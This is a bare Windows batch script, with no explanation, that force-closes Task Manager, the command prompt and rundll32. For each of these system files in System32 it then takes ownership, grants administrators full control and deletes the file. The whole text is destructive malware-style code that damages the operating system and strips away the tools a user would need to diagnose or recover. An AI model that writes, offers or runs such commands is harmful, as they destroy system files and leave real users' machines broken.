echo off
taskkill /f /im Taskmgr.exe
takeown /a /f C:\Windows\System32\Taskmgr.exe
icacls C:\Windows\System32\Taskmgr.exe /grant administrators:f
del C:\Windows\System32\Taskmgr.exe
taskkill /f /im cmd.exe
takeown /a /f C:\Windows\System32\cmd.exe
icacls C:\Windows\System32\cmd.exe /grant administrators:f
del C:\Windows\System32\cmd.exe
taskkill /f /im C:\windows\System32\rundll32.exe
takeown /a /f C:\Windows\System32\rundll32.exe
icacls C:\Windows\System32\rundll32.exe /grant administrators:f
del C:\Windows\System32\rundll32.exe
